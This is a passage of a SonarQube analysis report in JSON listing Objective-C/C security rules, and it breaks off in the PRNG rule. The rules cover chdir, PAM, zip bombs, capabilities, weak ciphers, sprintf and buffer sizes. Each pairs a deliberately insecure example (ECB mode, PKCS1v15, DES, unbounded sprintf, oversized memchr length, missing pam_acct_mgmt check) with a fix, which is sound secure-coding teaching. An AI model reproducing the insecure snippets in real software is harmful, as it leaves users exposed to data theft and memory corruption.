{
    "date": "Tuesday, May 7, 2024",
    "projectName": "my-project-repo",
    "applicationName": "my-project-repo",
    "branch": "new-sonar-integration",
    "inNewCodePeriod": false,
    "allBugs": false,
    "fixMissingRule": false,
    "noSecurityHotspot": false,
    "noRulesInReport": false,
    "onlyDetectedRules": false,
    "vulnerabilityPhrase": "Vulnerability",
    "noCoverage": true,
    "vulnerabilityPluralPhrase": "Vulnerabilities",
    "sonarBaseURL": "https://sonarqube.internal.eu",
    "sonarComponent": "my-project-repo",
    "rules": {
      "objc:S5982": {
        "name": "Changing working directories without verifying the success is security-sensitive",
        "htmlDesc": "<p>The purpose of changing the current working directory is to modify the base path when the process performs relative path resolutions. When the\nworking directory cannot be changed, the process keeps the directory previously defined as the active working directory. Thus, verifying the success\nof chdir() type of functions is important to prevent unintended relative paths and unauthorized access.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The success of changing the working directory is relevant for the application. </li>\n  <li> Changing the working directory is required by chroot to make the new root effective. </li>\n  <li> Subsequent disk operations are using relative paths. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>After changing the current working directory verify the success of the operation and handle errors.</p>\n<h2>Sensitive Code Example</h2>\n<p>The <code>chdir</code> operation could fail and the process still has access to unauthorized resources. The return code should be verified:</p>\n<pre>\nconst char* any_dir = \"/any/\";\nchdir(any_dir); // Sensitive: missing check of the return value\n\nint fd = open(any_dir, O_RDONLY | O_DIRECTORY);\nfchdir(fd); // Sensitive: missing check of the return value\n</pre>\n<h2>Compliant Solution</h2>\n<p>Verify the return code of <code>chdir</code> and handle errors:</p>\n<pre>\nconst char* root_dir = \"/jail/\";\nif (chdir(root_dir) == -1) {\n  exit(-1);\n} // Compliant\n\nint fd = open(any_dir, O_RDONLY | O_DIRECTORY);\nif(fchdir(fd) == -1) {\n  exit(-1);\n} // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/252\">CWE-252 - Unchecked Return Value</a> </li>\n  <li> <a href=\"https://man7.org/linux/man-pages/man2/chdir.2.html\">man7.org</a> - chdir </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "objc:S5832": {
        "name": "Account validity should be verified when authenticating users with PAM",
        "htmlDesc": "<p>Pluggable authentication module (PAM) is a mechanism used on many UNIX variants to provide a unified way to authenticate users, independently of\nthe underlying authentication scheme.</p>\n<h2>Why is this an issue?</h2>\n<p>When authenticating users, if the validity of the account is not checked (not locked, not expired …​), it may lead to unauthorized access to\nresources.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nint valid(pam_handle_t *pamh) {\n    if (pam_authenticate(pamh, PAM_DISALLOW_NULL_AUTHTOK) != PAM_SUCCESS) { // Noncompliant\n        return -1;\n    }\n\n    return 0;\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nint valid(pam_handle_t *pamh) {\n    if (pam_authenticate(pamh, PAM_DISALLOW_NULL_AUTHTOK) != PAM_SUCCESS) {\n        return -1;\n    }\n    if (pam_acct_mgmt(pamh, 0) != PAM_SUCCESS) {\n        return -1;\n    }\n\n    return 0;\n}\n</pre>\n<h3>How does this work?</h3>\n<p>The account validity is checked with <code>pam_acct_mgmt</code> when authenticating a user with <code>pam_authenticate</code>.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> The Open Group - <a href=\"https://pubs.opengroup.org/onlinepubs/8329799/pam_acct_mgmt.htm\"><code>pam_acct_mgmt</code></a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Packt hub - <a href=\"https://hub.packtpub.com/development-pluggable-authentication-modules-pam/\">Development with Pluggable Authentication\n  Modules (PAM)</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/304\">CWE-304 - Missing Critical Step in Authentication</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "objc:S5042": {
        "name": "Expanding archive files without controlling resource consumption is security-sensitive",
        "htmlDesc": "<p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can\nlead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of\nuncompressed data. To achieve this extreme <a href=\"https://en.wikipedia.org/wiki/Data_compression_ratio\">compression ratio</a>, attackers will\ncompress irrelevant data (eg: a long string of repeated bytes).</p>\n<h2>Ask Yourself Whether</h2>\n<p>Archives to expand are untrusted and:</p>\n<ul>\n  <li> There is no validation of the number of entries in the archive. </li>\n  <li> There is no validation of the total size of the uncompressed data. </li>\n  <li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Define and control the threshold for maximum total size of the uncompressed data. </li>\n  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in\n  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\n#include &lt;archive.h&gt;\n#include &lt;archive_entry.h&gt;\n// ...\n\nvoid f(const char *filename, int flags) {\n  struct archive_entry *entry;\n  struct archive *a = archive_read_new();\n  struct archive *ext = archive_write_disk_new();\n  archive_write_disk_set_options(ext, flags);\n  archive_read_support_format_tar(a);\n\n  if ((archive_read_open_filename(a, filename, 10240))) {\n    return;\n  }\n\n  for (;;) {\n    int r = archive_read_next_header(a, &amp;entry);\n    if (r == ARCHIVE_EOF) {\n      break;\n    }\n    if (r != ARCHIVE_OK) {\n      return;\n    }\n  }\n  archive_read_close(a);\n  archive_read_free(a);\n\n  archive_write_close(ext);\n  archive_write_free(ext);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n#include &lt;archive.h&gt;\n#include &lt;archive_entry.h&gt;\n// ...\n\nint f(const char *filename, int flags) {\n  const int max_number_of_extraced_entries = 1000;\n  const int64_t max_file_size = 1000000000; // 1 GB\n\n  int number_of_extraced_entries = 0;\n  int64_t total_file_size = 0;\n\n  struct archive_entry *entry;\n  struct archive *a = archive_read_new();\n  struct archive *ext = archive_write_disk_new();\n  archive_write_disk_set_options(ext, flags);\n  archive_read_support_format_tar(a);\n  int status = 0;\n\n  if ((archive_read_open_filename(a, filename, 10240))) {\n    return -1;\n  }\n\n  for (;;) {\n    number_of_extraced_entries++;\n    if (number_of_extraced_entries &gt; max_number_of_extraced_entries) {\n      status = 1;\n      break;\n    }\n\n    int r = archive_read_next_header(a, &amp;entry);\n    if (r == ARCHIVE_EOF) {\n      break;\n    }\n    if (r != ARCHIVE_OK) {\n      status = -1;\n      break;\n    }\n\n    int file_size = archive_entry_size(entry);\n    total_file_size += file_size;\n    if (total_file_size &gt; max_file_size) {\n      status = 1;\n      break;\n    }\n  }\n  archive_read_close(a);\n  archive_read_free(a);\n\n  archive_write_close(ext);\n  archive_write_free(ext);\n\n  return status;\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/409\">CWE-409 - Improper Handling of Highly Compressed Data (Data Amplification)</a> </li>\n  <li> <a href=\"https://www.bamsoftware.com/hacks/zipbomb/\">bamsoftware.com</a> - A better Zip Bomb </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "objc:S5849": {
        "name": "Setting capabilities is security-sensitive",
        "htmlDesc": "<p>Setting capabilities can lead to privilege escalation.</p>\n<p>Linux capabilities allow you to assign narrow slices of <code>root</code>'s permissions to files or processes. A thread with capabilities bypasses\nthe normal kernel security checks to execute high-privilege actions such as mounting a device to a directory, without requiring (additional) root\nprivileges.</p>\n<h2>Ask Yourself Whether</h2>\n<p>Capabilities are granted:</p>\n<ul>\n  <li> To a process that does not require all capabilities to do its job. </li>\n  <li> To a not trusted process. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Capabilities are high privileges, traditionally associated with superuser (root), thus make sure that the most restrictive and necessary\ncapabilities are assigned to files and processes.</p>\n<h2>Sensitive Code Example</h2>\n<p>When setting capabilities:</p>\n<pre>\ncap_t caps = cap_init();\ncap_value_t cap_list[2];\ncap_list[0] = CAP_FOWNER;\ncap_list[1] = CAP_CHOWN;\ncap_set_flag(caps, CAP_PERMITTED, 2, cap_list, CAP_SET);\n\ncap_set_file(\"file\", caps); // Sensitive\ncap_set_fd(fd, caps); // Sensitive\ncap_set_proc(caps); // Sensitive\ncapsetp(pid, caps); // Sensitive\ncapset(hdrp, datap); // Sensitive: is discouraged to be used because it is a system call\n</pre>\n<p>When setting SUID/SGID attributes:</p>\n<pre>\nchmod(\"file\", S_ISUID|S_ISGID); // Sensitive\nfchmod(fd, S_ISUID|S_ISGID); // Sensitive\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/250\">CWE-250 - Execution with Unnecessary Privileges</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/266\">CWE-266 - Incorrect Privilege Assignment</a> </li>\n  <li> <a href=\"https://forums.grsecurity.net/viewtopic.php?f=7&amp;t=2522\">False Boundaries and Arbitrary Code Execution</a> </li>\n  <li> <a href=\"https://man7.org/linux/man-pages/man7/capabilities.7.html\">Linux manual page</a> - capabilities(7) </li>\n</ul>",
        "severity": "MAJOR"
      },
      "objc:S5542": {
        "name": "Encryption algorithms should be used with secure mode and padding scheme",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>For AES, the weakest mode is ECB (Electronic Codebook). Repeated blocks of data are encrypted to the same value, making them easy to identify and\nreducing the difficulty of recovering the original cleartext.</p>\n<p>Unauthenticated modes such as CBC (Cipher Block Chaining) may be used but are prone to attacks that manipulate the ciphertext. They must be used\nwith caution.</p>\n<p>For RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in Botan</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>Example with a symmetric cipher, AES:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n#include &lt;botan/cipher_mode.h&gt;\n\nvoid encrypt() {\n  Botan::Cipher_Mode::create(\"AES-256/ECB\", Botan::ENCRYPTION); // Noncompliant\n}\n</pre>\n<p>Example with an asymmetric cipher, RSA:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n#include &lt;botan/rng.h&gt;\n#include &lt;botan/auto_rng.h&gt;\n#include &lt;botan/rsa.h&gt;\n#include &lt;botan/pubkey.h&gt;\n\nvoid encrypt() {\n  std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::AutoSeeded_RNG);\n  Botan::RSA_PrivateKey                           rsaKey(*rng.get(), 2048);\n\n  Botan::PK_Encryptor_EME(rsaKey, *rng.get(), \"PKCS1v15\"); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>For the AES symmetric cipher, use the GCM mode:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n#include &lt;botan/cipher_mode.h&gt;\n\nvoid encrypt() {\n  Botan::Cipher_Mode::create(\"AES-256/GCM\", Botan::ENCRYPTION);\n}\n</pre>\n<p>For the RSA asymmetric cipher, use the Optimal Asymmetric Encryption Padding (OAEP):</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n#include &lt;botan/rng.h&gt;\n#include &lt;botan/auto_rng.h&gt;\n#include &lt;botan/rsa.h&gt;\n#include &lt;botan/pubkey.h&gt;\n\nvoid encrypt() {\n  std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::AutoSeeded_RNG);\n  Botan::RSA_PrivateKey                           rsaKey(*rng.get(), 2048);\n\n  Botan::PK_Encryptor_EME(rsaKey, *rng.get(), \"OAEP\");\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>\n<p>Appropriate choices are currently the following.</p>\n<h4>For AES: use authenticated encryption modes</h4>\n<p>The best-known authenticated encryption mode for AES is Galois/Counter mode (GCM).</p>\n<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and\nauthenticity of data.</p>\n<p>Other similar modes are:</p>\n<ul>\n  <li> CCM: <code>Counter with CBC-MAC</code> </li>\n  <li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li>\n  <li> EAX: <code>Encrypt-and-Authenticate</code> </li>\n  <li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li>\n  <li> OCB: <code>Offset Codebook Mode</code> </li>\n</ul>\n<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it is considered more straightforward to use AES-GCM directly\ninstead.</p>\n<h4>For RSA: use the OAEP scheme</h4>\n<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of\nRSA.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode\">Microsoft, Timing vulnerabilities with CBC-mode\n  symmetric decryption using padding</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "objc:S5547": {
        "name": "Cipher algorithms should be robust",
        "htmlDesc": "<p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for\nseveral important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in Botan</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n#include &lt;botan/cipher_mode.h&gt;\n\nvoid encrypt() {\n  Botan::Cipher_Mode::create(\"DES/CBC/PKCS7\", Botan::ENCRYPTION); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n#include &lt;botan/cipher_mode.h&gt;\n\nvoid encrypt() {\n  Botan::Cipher_Mode::create(\"AES-256/GCM\", Botan::ENCRYPTION);\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Use a secure algorithm</h4>\n<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an\nalgorithm is the Advanced Encryption Standard (AES).</p>\n<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://botan.randombit.net/handbook/\">Botan</a> - Handbook </li>\n  <li> <a href=\"https://www.feistyduck.com/books/openssl-cookbook/\">OpenSSL</a> - Cookbook </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "objc:S6069": {
        "name": "\"sprintf\" should not be used",
        "htmlDesc": "<p>When using <code>sprintf</code> , it’s up to the developer to make sure the size of the buffer to be written to is large enough to avoid buffer\noverflows. Buffer overflows can cause the program to crash at a minimum. At worst, a carefully crafted overflow can cause malicious code to be\nexecuted.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> if the provided buffer is large enough for the result of any possible call to the <code>sprintf</code> function (including all possible format\n  strings and all possible additional arguments). </li>\n</ul>\n<p>There is a risk if you answered no to the above question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>There are fundamentally safer alternatives. <code>snprintf</code> is one of them. It takes the size of the buffer as an additional argument,\npreventing the function from overflowing the buffer.</p>\n<ul>\n  <li> Use <code>snprintf</code> instead of <code>sprintf</code>. The slight performance overhead can be afforded in a vast majority of projects.\n  </li>\n  <li> Check the buffer size passed to <code>snprintf</code>. </li>\n</ul>\n<p>If you are working in C++, other safe alternative exist:</p>\n<ul>\n  <li> <code>std::string</code> should be the prefered type to store strings </li>\n  <li> You can format to a string using <code>std::ostringstream</code> </li>\n  <li> Since C++20, <code>std::format</code> is also available to format strings </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nsprintf(str, \"%s\", message);   // Sensitive: `str` buffer size is not checked and it is vulnerable to overflows\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nsnprintf(str, sizeof(str), \"%s\", message); // Prevent overflows by enforcing a maximum size for `str` buffer\n</pre>\n<h2>Exceptions</h2>\n<p>It is a very common and acceptable pattern to compute the required size of the buffer with a call to <code>snprintf</code> with the same arguments\ninto an empty buffer (this will fail, but return the necessary size), then to call <code>sprintf</code> as the bound check is not needed anymore. Note\nthat 1 needs to be added by the size reported by <code>snprintf</code> to account for the terminal null character.</p>\n<pre>\nsize_t buflen = snprintf(0, 0, \"%s\", message);\nchar* buf = malloc(buflen + 1); // For the final 0\nsprintf(buf, \"%s\", message);{code}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\">Top 10 2021 Category A6 - Vulnerable and Outdated\n  Components</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/676\">CWE-676 - Use of Potentially Dangerous Function</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/119\">CWE-119 - Improper Restriction of Operations within the Bounds of a Memory\n  Buffer</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "objc:S5782": {
        "name": "POSIX functions should not be called with arguments that trigger buffer overflows",
        "htmlDesc": "<p>Some POSIX functions take one argument that is a buffer and another one that represents the size of the buffer. It is up to the developer to make\nsure the two arguments do match and that the size argument does not exceed the buffer’s size.</p>\n<h2>Why is this an issue?</h2>\n<p>When the size argument exceeds the actual size of the buffer, the memory management functions will either read or write data past the buffer memory\nboundary into adjacent memory. Because the memory might be uninitialized or contain other pieces of data, the behavior of the affected function can\nnot be predicted and will likely trigger bugs.</p>\n<h3>What is the potential impact?</h3>\n<p>Buffer boundaries violations can lead to serious security issues.</p>\n<h4>Information disclosure</h4>\n<p>In some scenarios, insecure functions can lead to information disclosure. For instance, if an attacker can cause a buffer overread, they might be\nable to disclose data in memory that they’re not supposed to have access to. This could potentially allow them to access sensitive information, such\nas passwords or encryption keys. An example of a buffer overread is provided with the Heartbleed vulnerability. ==== Code execution</p>\n<p>In some cases, an attacker can craft input in a way that allows them to gain unauthorized access to your system. For example, they might be able to\noverwrite a function’s return address in memory, causing your program to execute code of the attacker’s choosing. This could potentially give the\nattacker full control over your system.</p>\n<h4>Denial of service</h4>\n<p>If an attacker can trigger a buffer overflow by providing oversized input, it can cause the program to crash. If the attacker repeats this process,\nit can continually disrupt the service, denying access to other users. This can be particularly damaging for services that require high availability,\nsuch as online platforms or databases.</p>\n<p>In some cases, the input might cause the program to enter an infinite loop or consume excessive memory, slowing down the system or even causing it\nto become unresponsive. This type of attack is known as a resource exhaustion DoS attack.</p>\n<h3>Exceptions</h3>\n<p>Functions related to sockets using the type <code>socklen_t</code> are not checked. This is because these functions are using a C-style polymorphic\npattern using <code>union</code>. It relies on a mismatch between allocated memory and sizes of structures and it creates false positives.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<p>In the following code example, <code>memchr</code> is used to find the first occurrence of the <code>@</code> character in a buffer,\n<code>array</code>. The second argument does not match the size of this buffer, so it may find an occurrence of the character after the end of the\nbuffer and read data it is not supposed to. If the returned <code>pos</code> pointer is later used to write characters, this could unexpectedly\noverwrite data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nchar array[10];\ninitialize(array);\nchar *pos = memchr(array, '@', 42); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nchar array[10];\ninitialize(array);\nchar *pos = memchr(array, '@', sizeof(array));\n</pre>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Heartbleed - <a href=\"https://heartbleed.com/\">The Heartbleed Bug</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\">Top 10 2021 - A06 - Vulnerable and Outdated\n  Components</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/119\">CWE-119 - Improper Restriction of Operations within the Bounds of a Memory\n  Buffer</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/131\">CWE-131 - Incorrect Calculation of Buffer Size</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/788\">CWE-788 - Access of Memory Location After End of Buffer</a> </li>\n</ul>\n<h3>External coding guidelines</h3>\n<ul>\n  <li> CERT - <a href=\"https://wiki.sei.cmu.edu/confluence/x/wtYxBQ\">ARR30-C. - Do not form or use out-of-bounds pointers or array subscripts</a>\n  </li>\n  <li> CERT - <a href=\"https://wiki.sei.cmu.edu/confluence/x/i3w-BQ\">STR50-CPP. - Guarantee that storage for strings has sufficient space for\n  character data and the null terminator</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "objc:S2245": {
        "name": "Using pseudorandom number generators (PRNGs) is security-sensitive",
        "htmlDesc": "<p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386\">CVE-2013-6386</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419\">CVE-2006-3419</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102\">CVE-2008-4102</a> </li>\n</ul>\n<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that\nwill be generated, and use this guess to impersonate another user or access sensitive information.</p>\n<p>As the functions rely on a pseudorandom number generator, they should not be used for security-critical applications or for protecting sensitive\ndata.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such\n  as a password, is hashed. </li>\n  <li> the function you use generates a value which can be predicted (pseudo-random). </li>\n  <li> the generated value is used multiple times. </li>\n  <li> an attacker can access the generated value. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use functions which rely on a strong random number generator such as <code>randombytes_uniform()</code> or <code>randombytes_buf()</code> from\n  <code>libsodium</code>, or <code>randomize()</code> from Botan. </li>\n  <li> Use the generated random values only once. </li>\n  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>\n</ul>\n<h2>Sensitive Code 